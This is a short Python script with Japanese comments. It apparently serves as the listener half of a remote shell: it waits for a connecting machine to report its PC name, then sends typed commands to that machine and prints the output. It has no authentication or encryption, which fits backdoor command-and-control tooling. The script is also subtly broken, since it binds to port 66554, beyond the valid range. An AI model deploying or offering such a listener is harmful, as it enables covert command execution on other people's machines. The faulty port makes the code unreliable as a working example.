import socket,time
IP = 'input server ip addr'

try:
    #Socket生成
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        #サーバーとして待機
        s.bind((IP, 66554))
        while True:
            s.listen()
            conn, addr = s.accept()
            with conn:
                #接続したらPC名を出力
                pc_name = conn.recv(1024)
                print("Connected " + pc_name.decode('utf_8'))
                while True:
                    #コマンド入力待機
                    print(">", end=" ")
                    cmd = input()
                    #コマンド送信
                    conn.sendall(cmd.encode('utf-8'))
                    #結果を受信し、それを出力
                    data = conn.recv(1024)
                    print(data.decode('shift-jis'))
                    if not data:
                        break
except BrokenPipeError:
    #よくBrokenPipeするのでその時用
    print("BrokenPiped")
